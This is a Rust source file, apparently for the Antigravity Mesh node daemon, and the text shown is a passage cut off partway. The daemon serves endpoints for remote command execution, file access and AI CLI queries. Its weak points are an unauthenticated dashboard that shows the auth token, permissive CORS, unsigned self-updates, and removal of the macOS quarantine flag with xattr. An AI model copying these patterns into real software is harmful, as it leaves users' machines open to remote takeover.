#![windows_subsystem = "windows"]

pub mod autostart;
mod tray;
mod session_log;
mod power;
pub mod domain;
pub mod state_store;
pub mod task_engine;

use domain::{CapabilitySet, ExecutionPolicy, NodeInfo, Task, TaskType};
use state_store::StateStore;
use task_engine::TaskEngine;
use power::SleepAssertion;

use axum::{
    Router,
    extract::{ConnectInfo, Query, State},
    http::{HeaderMap, HeaderValue, StatusCode, header},
    response::{
        Html, IntoResponse, Json, Response,
        sse::{Event, KeepAlive, Sse},
    },
    routing::{get, post},
};
use clap::Parser;
use rand::{Rng, distributions::Alphanumeric};
use serde::{Deserialize, Serialize};
use serde_json::json;

use std::{
    collections::HashMap,
    fs,
    net::{IpAddr, SocketAddr},
    path::PathBuf,
    process::Stdio,
    sync::{
        Arc, Mutex, OnceLock,
        atomic::{AtomicU64, Ordering},
    },
    time::Duration,
};
use sysinfo::{Disks, System};
use tokio::{process::Command, sync::RwLock, time::timeout};
use tower_http::cors::CorsLayer;
use walkdir::WalkDir;

#[derive(Parser, Debug)]
#[command(
    name = "agy-mesh-daemon",
    about = "Antigravity Mesh Native Node Daemon"
)]
struct Cli {
    #[arg(long, default_value = "0.0.0.0")]
    host: String,

    #[arg(long, default_value_t = 8888)]
    port: u16,

    #[arg(long)]
    token: Option<String>,

    #[arg(long)]
    no_tray: bool,

    /// Disable automatic system sleep prevention
    #[arg(long)]
    no_prevent_sleep: bool,

    /// Path to AI CLI binary (agy, gemini, claude, etc.). Auto-detected if not specified.
    #[arg(long)]
    agy_path: Option<String>,
}

#[derive(Clone)]
struct AppState {
    auth_token: Arc<RwLock<String>>,
    pairing_pin: Arc<RwLock<String>>,
    node_name: String,
    port: u16,
    /// Resolved path to AI CLI binary (agy, gemini, claude, etc.), or None if not found.
    agy_cli_path: Option<String>,
    update_offer: Arc<RwLock<Option<String>>>,
    task_engine: Arc<TaskEngine>,
    execution_policy: Arc<RwLock<ExecutionPolicy>>,
}

fn get_config_path() -> PathBuf {
    if let Some(home) = dirs_home() {
        home.join(".gemini").join("mesh_nodes.json")
    } else {
        PathBuf::from("mesh_nodes.json")
    }
}

fn dirs_home() -> Option<PathBuf> {
    #[cfg(windows)]
    {
        std::env::var_os("USERPROFILE").map(PathBuf::from)
    }
    #[cfg(not(windows))]
    {
        if let Some(h) = std::env::var_os("HOME").map(PathBuf::from) {
            Some(h)
        } else if let Ok(user) = std::env::var("USER") {
            #[cfg(target_os = "macos")]
            {
                Some(PathBuf::from(format!("/Users/{}", user)))
            }
            #[cfg(not(target_os = "macos"))]
            {
                Some(PathBuf::from(format!("/home/{}", user)))
            }
        } else {
            None
        }
    }
}

fn load_or_create_token(cli_token: Option<String>, port: u16) -> String {
    if let Some(t) = cli_token {
        return t;
    }

    let config_path = get_config_path();
    if let Ok(content) = fs::read_to_string(&config_path)
        && let Ok(nodes) = serde_json::from_str::<HashMap<String, serde_json::Value>>(&content)
    {
        for key in ["local", "local-node", "local-mac", "local-win", "self"] {
            if let Some(node) = nodes.get(key)
                && let Some(token) = node.get("token").and_then(|v| v.as_str())
            {
                return token.to_string();
            }
        }
    }

    // Generate new random hex token (32 chars)
    let new_token: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(32)
        .map(char::from)
        .collect();

    // Persist into config
    let mut nodes: HashMap<String, serde_json::Value> = HashMap::new();
    if let Ok(content) = fs::read_to_string(&config_path)
        && let Ok(existing) = serde_json::from_str(&content)
    {
        nodes = existing;
    }

    nodes.insert(
        "local".to_string(),
        json!({
            "host": "127.0.0.1",
            "port": port,
            "token": new_token
        }),
    );

    if let Some(parent) = config_path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    let _ = fs::write(
        &config_path,
        serde_json::to_string_pretty(&nodes).unwrap_or_default(),
    );

    new_token
}

fn save_paired_node(node_name: &str, host: &str, port: u16, token: &str) {
    let config_path = get_config_path();
    let mut nodes: HashMap<String, serde_json::Value> = HashMap::new();
    if let Ok(content) = fs::read_to_string(&config_path)
        && let Ok(existing) = serde_json::from_str(&content)
    {
        nodes = existing;
    }

    nodes.insert(
        node_name.to_string(),
        json!({
            "host": host,
            "port": port,
            "token": token
        }),
    );

    if let Some(parent) = config_path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    let _ = fs::write(
        &config_path,
        serde_json::to_string_pretty(&nodes).unwrap_or_default(),
    );
}

fn is_device_already_paired(node_name: &str, host: &str, token: &str) -> bool {
    let config_path = get_config_path();
    if let Ok(content) = fs::read_to_string(&config_path)
        && let Ok(nodes) = serde_json::from_str::<HashMap<String, serde_json::Value>>(&content)
    {
        // 1. Direct match by node_name
        if let Some(entry) = nodes.get(node_name) {
            let saved_host = entry.get("host").and_then(|v| v.as_str()).unwrap_or("");
            let saved_token = entry.get("token").and_then(|v| v.as_str()).unwrap_or("");
            if !saved_token.is_empty() && saved_token == token {
                return true;
            }
            if !saved_host.is_empty() && (saved_host == host || host == "127.0.0.1") {
                return true;
            }
        }
        // 2. Match by host and token across entries
        for (_name, entry) in nodes.iter() {
            let saved_host = entry.get("host").and_then(|v| v.as_str()).unwrap_or("");
            let saved_token = entry.get("token").and_then(|v| v.as_str()).unwrap_or("");
            if !saved_host.is_empty() && (saved_host == host || host == "127.0.0.1") {
                if !saved_token.is_empty() && saved_token == token {
                    return true;
                }
            }
        }
    }
    false
}

fn is_private_ip(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(ipv4) => {
            let o = ipv4.octets();
            let is_cgnat = o[0] == 100 && (64..=127).contains(&o[1]);
            ipv4.is_loopback() || ipv4.is_private() || ipv4.is_link_local() || is_cgnat
        }
        IpAddr::V6(ipv6) => ipv6.is_loopback(),
    }
}

async fn verify_auth(headers: &HeaderMap, state: &AppState) -> bool {
    let expected = state.auth_token.read().await;
    if expected.is_empty() {
        return true;
    }

    if let Some(token) = headers.get("X-Mesh-Token")
        && let Ok(t) = token.to_str()
        && t.trim() == *expected
    {
        return true;
    }

    if let Some(auth) = headers.get("Authorization")
        && let Ok(a) = auth.to_str()
    {
        let stripped = a.replace("Bearer ", "");
        if stripped.trim() == *expected {
            return true;
        }
    }

    false
}

static RECENT_LOGS: Mutex<Vec<String>> = Mutex::new(Vec::new());
static START_INSTANT: OnceLock<std::time::Instant> = OnceLock::new();
static REQUEST_COUNTER: AtomicU64 = AtomicU64::new(0);

fn log_message(msg: &str) {
    println!("{}", msg);
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let sec = ts % 60;
    let min = (ts / 60) % 60;
    let hour = (ts / 3600) % 24;
    let formatted = format!("[{:02}:{:02}:{:02}] {}", hour, min, sec, msg);

    if let Ok(mut logs) = RECENT_LOGS.lock() {
        if logs.len() >= 40 {
            logs.remove(0);
        }
        logs.push(formatted.clone());
    }

    #[cfg(not(windows))]
    {
        if let Ok(mut f) = fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open("/tmp/antigravity_mesh.log")
        {
            use std::io::Write;
            let _ = writeln!(f, "{}", formatted);
        }
    }
}

fn get_local_lan_ip() -> String {
    if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
        if socket.connect("8.8.8.8:80").is_ok() {
            if let Ok(addr) = socket.local_addr() {
                let ip_str = addr.ip().to_string();
                if !ip_str.starts_with("127.") {
                    return ip_str;
                }
            }
        }
    }
    "127.0.0.1".to_string()
}

/// Discover the AI CLI binary by checking common names and locations.
/// Returns the full path to the binary, or None if not found.
fn discover_agy_cli(explicit_path: Option<String>) -> Option<String> {
    // If user explicitly specified a path, validate it
    if let Some(ref path) = explicit_path {
        let p = std::path::Path::new(path);
        if p.exists() && p.is_file() {
            return explicit_path;
        }
        #[cfg(windows)]
        let finder = "where.exe";
        #[cfg(not(windows))]
        let finder = "which";

        if let Ok(output) = std::process::Command::new(finder).arg(path).output()
            && output.status.success()
        {
            let found = String::from_utf8_lossy(&output.stdout)
                .lines()
                .next()
                .unwrap_or("")
                .trim()
                .to_string();
            if !found.is_empty() && std::path::Path::new(&found).exists() {
                return Some(found);
            }
        }
        eprintln!(
            "⚠️  Specified --agy-path '{}' not found, falling back to auto-detection",
            path
        );
    }

    #[cfg(windows)]
    let finder = "where.exe";
    #[cfg(not(windows))]
    let finder = "which";

    for name in &["agy", "gemini", "claude"] {
        if let Ok(output) = std::process::Command::new(finder).arg(name).output()
            && output.status.success()
        {
            let found = String::from_utf8_lossy(&output.stdout)
                .lines()
                .next()
                .unwrap_or("")
                .trim()
                .to_string();
            if !found.is_empty() && std::path::Path::new(&found).exists() {
                println!("🔍 Found AI CLI: {}", found);
                return Some(found);
            }
        }
    }

    #[cfg(windows)]
    let cli_names = [
        "agy.exe",
        "agy.cmd",
        "agy.bat",
        "agy",
        "gemini.exe",
        "gemini.cmd",
        "gemini.bat",
        "gemini",
        "claude.exe",
        "claude.cmd",
        "claude.bat",
        "claude",
    ];
    #[cfg(not(windows))]
    let cli_names = ["agy", "gemini", "claude"];

    let mut search_dirs: Vec<PathBuf> = vec![
        PathBuf::from("/usr/local/bin"),
        PathBuf::from("/usr/bin"),
        PathBuf::from("/opt/homebrew/bin"),
    ];

    if let Some(home) = dirs_home() {
        search_dirs.push(home.join(".local").join("bin"));
        search_dirs.push(home.join(".cargo").join("bin"));
        search_dirs.push(home.join(".gemini").join("antigravity-ide").join("bin"));
        search_dirs.push(
            home.join(".antigravity-ide")
                .join("antigravity-ide")
                .join("bin"),
        );
        search_dirs.push(home.join(".npm-global").join("bin"));
        search_dirs.push(home.join("node_modules").join(".bin"));

        #[cfg(windows)]
        {
            if let Ok(localappdata) = std::env::var("LOCALAPPDATA") {
                let lad = PathBuf::from(localappdata);
                search_dirs.push(lad.join("agy").join("bin"));
                search_dirs.push(lad.join("Programs").join("agy"));
                search_dirs.push(lad.join("Microsoft").join("WindowsApps"));
                search_dirs.push(lad.join("Python").join("bin"));
                search_dirs.push(lad.join("Python").join("Scripts"));
            }
            if let Ok(appdata) = std::env::var("APPDATA") {
                let ad = PathBuf::from(appdata);
                search_dirs.push(ad.join("npm"));
            }
        }
    }

    for dir in &search_dirs {
        for name in &cli_names {
            let candidate = dir.join(name);
            if candidate.is_file() {
                let found = candidate.to_string_lossy().to_string();
                println!("🔍 Found AI CLI: {}", found);
                return Some(found);
            }
        }
    }

    eprintln!("⚠️  No AI CLI (agy, gemini, claude) found. The /ask endpoint will be unavailable.");
    eprintln!("   Install one of: agy, gemini CLI, or claude CLI, and ensure it's in your PATH.");
    eprintln!("   Or use --agy-path /path/to/cli to specify explicitly.");
    None
}

async fn check_for_updates() -> Option<String> {
    let client = reqwest::Client::builder()
        .user_agent("AntigravityMesh-Desktop-UpdateCheck")
        .redirect(reqwest::redirect::Policy::limited(10))
        .timeout(Duration::from_secs(8))
        .build()
        .ok()?;

    let urls = [
        "https://github.com/kacperczeczot/antigravity-mesh/releases/latest/download/latest.json",
        "https://github.com/kacperczeczot/antigravity-mesh/releases/latest/download/android-latest.json",
        "https://raw.githubusercontent.com/kacperczeczot/antigravity-mesh/main/apps/android/android-latest.json",
        "https://gist.githubusercontent.com/kacperczeczot/d82255ff99003bf47ef59b8670ff4db0/raw/android-latest.json",
        "https://kacperczeczot.github.io/antigravity-mesh/android-latest.json",
    ];

    for url in urls {
        if let Ok(res) = client.get(url).send().await
            && let Ok(json) = res.json::<serde_json::Value>().await
            && let Some(version) = json.get("version").and_then(|v| v.as_str())
            && is_newer_version(version, env!("CARGO_PKG_VERSION"))
        {
            return Some(version.to_string());
        }
    }
    None
}

fn parse_ver(s: &str) -> (u32, u32, u32, &str) {
    let clean = s.trim().trim_start_matches('v').trim_start_matches('V');
    let parts: Vec<&str> = clean.split('.').collect();
    let major = parts.first().and_then(|p| p.parse().ok()).unwrap_or(0);
    let minor = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(0);
    let (patch, prerelease) = if let Some(p) = parts.get(2) {
        if let Some(idx) = p.find('-') {
            (p[..idx].parse().unwrap_or(0), &p[idx + 1..])
        } else {
            (p.parse().unwrap_or(0), "")
        }
    } else {
        (0, "")
    };
    (major, minor, patch, prerelease)
}

fn is_newer_version(remote: &str, current: &str) -> bool {
    let (r_maj, r_min, r_pat, r_pre) = parse_ver(remote);
    let (c_maj, c_min, c_pat, c_pre) = parse_ver(current);
    if (r_maj, r_min, r_pat) != (c_maj, c_min, c_pat) {
        return (r_maj, r_min, r_pat) > (c_maj, c_min, c_pat);
    }
    match (r_pre.is_empty(), c_pre.is_empty()) {
        (true, false) => true,
        (false, true) => false,
        (true, true) => false,
        (false, false) => compare_prerelease_natural(r_pre, c_pre).is_gt(),
    }
}

fn compare_prerelease_natural(a: &str, b: &str) -> std::cmp::Ordering {
    if a == b {
        return std::cmp::Ordering::Equal;
    }
    let tokenize = |s: &str| -> Vec<(bool, String)> {
        let mut tokens = Vec::new();
        let mut curr = String::new();
        let mut is_digit = false;
        for c in s.chars() {
            if c == '.' || c == '-' || c == '_' {
                if !curr.is_empty() {
                    tokens.push((is_digit, curr.clone()));
                    curr.clear();
                }
            } else if c.is_ascii_digit() {
                if !is_digit && !curr.is_empty() {
                    tokens.push((is_digit, curr.clone()));
                    curr.clear();
                }
                is_digit = true;
                curr.push(c);
            } else {
                if is_digit && !curr.is_empty() {
                    tokens.push((is_digit, curr.clone()));
                    curr.clear();
                }
                is_digit = false;
                curr.push(c);
            }
        }
        if !curr.is_empty() {
            tokens.push((is_digit, curr));
        }
        tokens
    };
    let toks_a = tokenize(a);
    let toks_b = tokenize(b);
    for (ta, tb) in toks_a.iter().zip(toks_b.iter()) {
        let cmp = if ta.0 && tb.0 {
            let na: u64 = ta.1.parse().unwrap_or(0);
            let nb: u64 = tb.1.parse().unwrap_or(0);
            na.cmp(&nb)
        } else {
            ta.1.cmp(&tb.1)
        };
        if cmp != std::cmp::Ordering::Equal {
            return cmp;
        }
    }
    toks_a.len().cmp(&toks_b.len())
}

#[cfg(target_os = "macos")]
fn clear_self_quarantine_if_needed() {
    if let Ok(current_exe) = std::env::current_exe() {
        let exe_str = current_exe.to_string_lossy();
        let _ = std::process::Command::new("xattr")
            .args(["-d", "com.apple.quarantine", &exe_str])
            .status();

        let mut curr = current_exe.clone();
        while let Some(parent) = curr.parent() {
            if parent.extension().and_then(|e| e.to_str()) == Some("app") {
                let app_str = parent.to_string_lossy();
                let _ = std::process::Command::new("xattr")
                    .args(["-cr", &app_str])
                    .status();
                break;
            }
            curr = parent.to_path_buf();
        }
    }
}

#[cfg(not(target_os = "macos"))]
fn clear_self_quarantine_if_needed() {}

pub async fn perform_self_update() -> Result<String, String> {
    let client = match reqwest::Client::builder()
        .user_agent("AntigravityMesh-Desktop-Updater")
        .redirect(reqwest::redirect::Policy::limited(10))
        .timeout(Duration::from_secs(120))
        .build()
    {
        Ok(c) => c,
        Err(e) => return Err(format!("Błąd klienta HTTP: {e}")),
    };

    let manifest_urls = [
        "https://github.com/kacperczeczot/antigravity-mesh/releases/latest/download/latest.json",
        "https://raw.githubusercontent.com/kacperczeczot/antigravity-mesh/main/apps/android/android-latest.json",
    ];

    let mut manifest_opt: Option<serde_json::Value> = None;
    for url in manifest_urls {
        if let Ok(res) = client.get(url).send().await
            && res.status().is_success()
            && let Ok(json) = res.json::<serde_json::Value>().await
        {
            manifest_opt = Some(json);
            break;
        }
    }

    let manifest = manifest_opt.ok_or_else(|| "Nie udało się pobrać manifestu aktualizacji".to_string())?;
    let version = manifest.get("version").and_then(|v| v.as_str()).unwrap_or("latest");

    let download_url = if cfg!(target_os = "macos") {
        manifest.get("macosBinaryUrl")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
            .unwrap_or_else(|| format!("https://github.com/kacperczeczot/antigravity-mesh/releases/download/v{}/AntigravityMesh-macOS", version))
    } else if cfg!(target_os = "windows") {
        manifest.get("windowsUrl")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
            .unwrap_or_else(|| format!("https://github.com/kacperczeczot/antigravity-mesh/releases/download/v{}/AntigravityMesh-Windows.exe", version))
    } else {
        manifest.get("linuxUrl")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
            .unwrap_or_else(|| format!("https://github.com/kacperczeczot/antigravity-mesh/releases/download/v{}/AntigravityMesh-Linux", version))
    };

    println!("⬇️ [AutoUpdate] Pobieranie v{} z: {}", version, download_url);

    let bin_res = client.get(&download_url).send().await
        .map_err(|e| format!("Błąd pobierania nowej wersji: {e}"))?;

    if !bin_res.status().is_success() {
        return Err(format!("Pobieranie nie powiodło się (HTTP {})", bin_res.status()));
    }

    let bytes = bin_res.bytes().await
        .map_err(|e| format!("Błąd odczytu danych binarza: {e}"))?;

    if bytes.len() < 100_000 {
        return Err(format!("Pobrany plik jest za mały ({} B) - przerwano", bytes.len()));
    }

    let current_exe = std::env::current_exe()
        .map_err(|e| format!("Nie można ustalić ścieżki bieżącego pliku: {e}"))?;

    let temp_new = current_exe.with_extension("update_tmp");
    std::fs::write(&temp_new, &bytes)
        .map_err(|e| format!("Nie udało się zapisać nowego pliku: {e}"))?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = std::fs::metadata(&temp_new) {
            let mut perms = meta.permissions();
            perms.set_mode(0o755);
            let _ = std::fs::set_permissions(&temp_new, perms);
        }
    }

    #[cfg(target_os = "macos")]
    {
        // 1. Zdejmij kwarantannę z nowego pobranego pliku natywnie jak w StageSync
        let temp_str = temp_new.to_string_lossy();
        let _ = std::process::Command::new("xattr")
            .args(["-d", "com.apple.quarantine", &temp_str])
            .status();

        // 2. Jeśli jesteśmy w bundle'u .app, zdejmij kwarantannę z całego .app
        let mut curr = current_exe.clone();
        while let Some(parent) = curr.parent() {
            if parent.extension().and_then(|e| e.to_str()) == Some("app") {
                let app_str = parent.to_string_lossy();
                let _ = std::process::Command::new("xattr")
                    .args(["-cr", &app_str])
                    .status();
                break;
            }
            curr = parent.to_path_buf();
        }
    }

    // Podmiana binarza
    let old_backup = current_exe.with_extension("old_bak");
    let _ = std::fs::remove_file(&old_backup);
    std::fs::rename(&current_exe, &old_backup)
        .map_err(|e| format!("Nie udało się przenieść bieżącego pliku: {e}"))?;

    if let Err(e) = std::fs::rename(&temp_new, &current_exe) {
        let _ = std::fs::rename(&old_backup, &current_exe);
        return Err(format!("Błąd zamiany pliku: {e}"));
    }
    let _ = std::fs::remove_file(&old_backup);

    #[cfg(target_os = "macos")]
    {
        let exe_str = current_exe.to_string_lossy();
        let _ = std::process::Command::new("xattr")
            .args(["-cr", &exe_str])
            .status();

        let mut curr = current_exe.clone();
        while let Some(parent) = curr.parent() {
            if parent.extension().and_then(|e| e.to_str()) == Some("app") {
                let app_str = parent.to_string_lossy();
                let _ = std::process::Command::new("xattr")
                    .args(["-cr", &app_str])
                    .status();

                let ent_path = std::env::temp_dir().join("AntigravityMesh_update.entitlements");
                let ent_content = include_str!("../assets/AntigravityMesh.entitlements");
                if let Ok(_) = std::fs::write(&ent_path, ent_content) {
                    let _ = std::process::Command::new("codesign")
                        .args([
                            "--force",
                            "--deep",
                            "--sign",
                            "-",
                            "-r=designated => identifier \"com.antigravity.mesh\"",
                            "--entitlements",
                            &ent_path.to_string_lossy(),
                            &app_str,
                        ])
                        .status();
                    let _ = std::fs::remove_file(&ent_path);
                }
                break;
            }
            curr = parent.to_path_buf();
        }
    }

    println!("✨ [AutoUpdate] Pomyślnie zaktualizowano do v{}! Restartowanie...", version);

    // Spawnowanie zaktualizowanego procesu i wyjście
    let exe_to_launch = current_exe.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(600)).await;
        let args: Vec<String> = std::env::args().skip(1).collect();
        let _ = std::process::Command::new(&exe_to_launch)
            .args(&args)
            .spawn();
        std::process::exit(0);
    });

    Ok(format!("Pomyślnie zaktualizowano do v{}. Trwa restartowanie...", version))
}

async fn handle_apply_update(
    headers: HeaderMap,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }

    match perform_self_update().await {
        Ok(msg) => Ok(Json(json!({
            "ok": true,
            "message": msg
        }))),
        Err(err) => Ok(Json(json!({
            "ok": false,
            "error": err
        }))),
    }
}

async fn track_requests(req: axum::extract::Request, next: axum::middleware::Next) -> axum::response::Response {
    REQUEST_COUNTER.fetch_add(1, Ordering::Relaxed);
    let path = req.uri().path().to_string();
    let method = req.method().to_string();
    let res = next.run(req).await;
    let status = res.status().as_u16();
    if path != "/system" && path != "/health" {
        log_message(&format!("📡 {} {} -> {}", method, path, status));
    }
    res
}

fn main() {
    START_INSTANT.get_or_init(std::time::Instant::now);
    clear_self_quarantine_if_needed();

    let cli = Cli::parse();

    let _sleep_assertion = if !cli.no_prevent_sleep {
        SleepAssertion::acquire("Antigravity Mesh Node Daemon Active")
    } else {
        println!("ℹ️ [Power] Zapobieganie uśpieniu systemu zostało wyłączone flagą --no-prevent-sleep");
        None
    };
    let token = load_or_create_token(cli.token, cli.port);
    let node_name = sysinfo::System::host_name().unwrap_or_else(|| "unknown-node".to_string());
    let agy_cli_path = discover_agy_cli(cli.agy_path);

    let update_available = {
        let rt = tokio::runtime::Runtime::new().ok();
        rt.and_then(|r| r.block_on(check_for_updates()))
    };

    if let Some(ref ver) = update_available {
        println!(
            "✨ New version available: v{}! (Current: v{})",
            ver,
            env!("CARGO_PKG_VERSION")
        );
    }

    let pairing_pin: String = format!("{:04}", rand::thread_rng().gen_range(1000..=9999));
    println!("🔢 Pairing PIN: {}", pairing_pin);

    let update_offer_bg = Arc::new(RwLock::new(update_available.clone()));
    let shared_pin = Arc::new(RwLock::new(pairing_pin.clone()));

    let state_store_path = StateStore::default_path();
    let state_store = match StateStore::open(&state_store_path) {
        Ok(s) => Arc::new(s),
        Err(e) => {
            eprintln!("⚠️ Błąd otwarcia bazy redb: {}. Używam bazy tymczasowej.", e);
            let tmp_path = std::env::temp_dir().join(format!("agy_mesh_{}.redb", rand::random::<u32>()));
            Arc::new(StateStore::open(tmp_path).expect("Nie udało się utworzyć bazy tymczasowej"))
        }
    };
    let task_engine = Arc::new(TaskEngine::new(state_store, agy_cli_path.clone()));

    let state = AppState {
        auth_token: Arc::new(RwLock::new(token.clone())),
        pairing_pin: shared_pin.clone(),
        port: cli.port,
        node_name: node_name.clone(),
        agy_cli_path: agy_cli_path.clone(),
        update_offer: update_offer_bg.clone(),
        task_engine,
        execution_policy: Arc::new(RwLock::new(ExecutionPolicy::default())),
    };

    let app = Router::new()
        .route("/", get(handle_root))
        .route("/health", get(handle_health))
        .route("/system", get(handle_system))
        .route("/check-updates", get(handle_check_updates))
        .route("/update/apply", post(handle_apply_update))
        .route("/query", post(handle_query))
        .route("/read-file", post(handle_read_file))
        .route("/file-raw", get(handle_file_raw).post(handle_file_raw_post))
        .route("/upload", post(handle_upload))
        .route("/exec", post(handle_exec))
        .route("/ask", post(handle_ask))
        .route("/ask/stream", post(handle_ask_stream))
        .route("/sessions", get(handle_sessions))
        .route("/pair", post(handle_pair))
        .route("/permissions", get(handle_permissions).post(handle_permissions))
        .route("/permissions/test", get(handle_permissions).post(handle_permissions))
        .route("/permissions/fix", post(handle_permissions_fix))
        // Modern v2.7 API v1 endpoints
        .route("/api/v1/node", get(handle_api_v1_node))
        .route("/api/v1/tasks", get(handle_api_v1_tasks_list).post(handle_api_v1_tasks_submit))
        .route("/api/v1/tasks/{id}", get(handle_api_v1_tasks_get).delete(handle_api_v1_tasks_cancel))
        .route("/api/v1/tasks/{id}/logs", get(handle_api_v1_tasks_logs))
        .route("/api/v1/sessions", get(handle_api_v1_sessions_list).post(handle_api_v1_sessions_save))
        .layer(axum::middleware::from_fn(track_requests))
        .layer(CorsLayer::permissive())
        .with_state(state);

    let addr: SocketAddr = format!("{}:{}", cli.host, cli.port)
        .parse()
        .expect("Invalid host/port");

    println!(
        "🚀 Antigravity Mesh Native Daemon (Rust) listening on {}",
        addr
    );
    println!("💻 Node Name: {}", node_name);
    println!("🔑 Auth Token: {}", token);
    println!("🤝 Zero-Touch LAN Pairing active on POST /pair");
    match &agy_cli_path {
        Some(path) => println!("🤖 AI CLI: {}", path),
        None => println!("⚠️  AI CLI: not found (/ask endpoint unavailable)"),
    }

    let run_gui = !cli.no_tray;
    let (ready_tx, ready_rx) = std::sync::mpsc::channel();

    // Spawn the Tokio runtime and HTTP server on background thread
    let server_handle = std::thread::spawn(move || {
        let rt = match tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
        {
            Ok(r) => r,
            Err(e) => {
                let _ = ready_tx.send(Err(format!("Failed to build Tokio runtime: {}", e)));
                return;
            }
        };

        rt.block_on(async move {
            let bg_check = update_offer_bg.clone();
            tokio::spawn(async move {
                let mut interval = tokio::time::interval(Duration::from_secs(300));
                interval.tick().await; // skip initial tick
                loop {
                    interval.tick().await;
                    if let Some(new_ver) = check_for_updates().await {
                        let mut w = bg_check.write().await;
                        if w.as_deref() != Some(&new_ver) {
                            println!("✨ Discovered new update in background: v{}", new_ver);
                            *w = Some(new_ver);
                        }
                    }
                }
            });

            let listener = match tokio::net::TcpListener::bind(addr).await {
                Ok(l) => {
                    let _ = ready_tx.send(Ok(()));
                    l
                }
                Err(e) => {
                    let msg = if e.kind() == std::io::ErrorKind::AddrInUse {
                        format!("Port {} is already in use! Another Antigravity Mesh instance might be running.", addr.port())
                    } else {
                        format!("Failed to bind TCP listener on {}: {}", addr, e)
                    };
                    let _ = ready_tx.send(Err(msg));
                    return;
                }
            };

            if let Err(e) = axum::serve(
                listener,
                app.into_make_service_with_connect_info::<SocketAddr>(),
            )
            .await
            {
                eprintln!("Server error: {}", e);
            }
        });
    });

    match ready_rx.recv() {
        Ok(Ok(())) => {
            println!("✅ Node server started successfully!");
            let web_url = format!("http://localhost:{}", cli.port);
            let _ = webbrowser::open(&web_url);
        }
        Ok(Err(err_msg)) => {
            eprintln!("❌ Startup error: {}", err_msg);
            std::process::exit(1);
        }
        Err(e) => {
            eprintln!("❌ Server initialization failed: {}", e);
            std::process::exit(1);
        }
    }

    if run_gui {
        if let Err(e) = tray::run_tray(cli.port, token, pairing_pin, shared_pin, node_name, update_available) {
            eprintln!("Tray error: {}, keeping server thread running", e);
            let _ = server_handle.join();
        }
    } else {
        let _ = server_handle.join();
    }
}

async fn handle_root(headers: HeaderMap, State(state): State<AppState>) -> impl IntoResponse {
    let update_opt = state.update_offer.read().await.clone();
    let update_banner = if let Some(ref latest) = update_opt {
        format!(
            r#"<div style="background: rgba(63, 185, 80, 0.12); border: 1px solid rgba(63, 185, 80, 0.4); border-radius: 12px; padding: 14px 16px; margin-bottom: 22px; display: flex; align-items: center; justify-content: space-between; gap: 14px;">
                <div>
                    <div style="font-weight: 700; color: #ffffff; font-size: 14px;">✨ Dostępna nowa wersja: v{}</div>
                    <div style="font-size: 12px; color: #8b949e; margin-top: 3px;">Automatyczna instalacja w tle (bez kwarantanny macOS).</div>
                </div>
                <div style="display: flex; gap: 8px; align-items: center;">
                    <button id="updateBtn" onclick="applyUpdate(this)" style="background: #238636; color: #ffffff; border: none; padding: 7px 14px; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; margin-left: 0;">⚡ Aktualizuj teraz</button>
                    <a href="https://github.com/kacperczeczot/antigravity-mesh/releases/latest" target="_blank" style="background: rgba(255, 255, 255, 0.08); color: #c9d1d9; text-decoration: none; padding: 7px 12px; border-radius: 6px; font-size: 12px; font-weight: 500;">GitHub</a>
                </div>
            </div>"#,
            latest
        )
    } else {
        "".to_string()
    };

    if let Some(accept) = headers.get("Accept")
        && let Ok(accept_str) = accept.to_str()
        && accept_str.contains("text/html")
    {
        let token = state.auth_token.read().await.clone();
        let pairing_pin = state.pairing_pin.read().await.clone();
        let pin_html = pairing_pin
            .chars()
            .map(|c| format!(r#"<span class="pin-digit">{}</span>"#, c))
            .collect::<Vec<_>>()
            .join("");

        let (agy_status, agy_cli) = match &state.agy_cli_path {
            Some(path) => ("Aktywny", path.as_str()),
            None => ("Niedostępny", "Zainstaluj agy lub gemini CLI"),
        };

        let lan_ip = get_local_lan_ip();

        let html = include_str!("dashboard.html")
            .replace("{node}", &state.node_name)
            .replace("{lan_ip}", &lan_ip)
            .replace("{ver}", env!("CARGO_PKG_VERSION"))
            .replace("{version}", env!("CARGO_PKG_VERSION"))
            .replace("{update_banner}", &update_banner)
            .replace("{port}", &state.port.to_string())
            .replace("{token}", &token)
            .replace("{pairing_pin}", &pairing_pin)
            .replace("{pin_html}", &pin_html)
            .replace("{agy_status}", agy_status)
            .replace("{agy_cli}", agy_cli);

        return Html(html).into_response();
    }

    let update_opt = state.update_offer.read().await.clone();
    Json(json!({
        "message": "Antigravity Mesh Native Daemon (Rust)",
        "version": env!("CARGO_PKG_VERSION"),
        "update_available": update_opt.is_some(),
        "latest_version": update_opt,
        "endpoints": ["GET /health", "GET /system", "GET /permissions", "POST /permissions/test", "GET /check-updates", "POST /update/apply", "POST /query", "POST /read-file", "POST /exec", "POST /ask", "POST /pair"]
    })).into_response()
}

async fn handle_health(
    headers: HeaderMap,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        log_message("⚠️ [handle_health] Unauthorized request");
        return Err(StatusCode::UNAUTHORIZED);
    }

    let os_name = sysinfo::System::name().unwrap_or_else(|| std::env::consts::OS.to_string());
    let update_opt = state.update_offer.read().await.clone();

    Ok(Json(json!({
        "status": "ok",
        "platform": os_name,
        "node": state.node_name,
        "port": state.port,
        "engine": "rust-native",
        "update_available": update_opt.is_some(),
        "latest_version": update_opt
    })))
}

async fn handle_check_updates(
    headers: HeaderMap,
    State(state): State<AppState>,
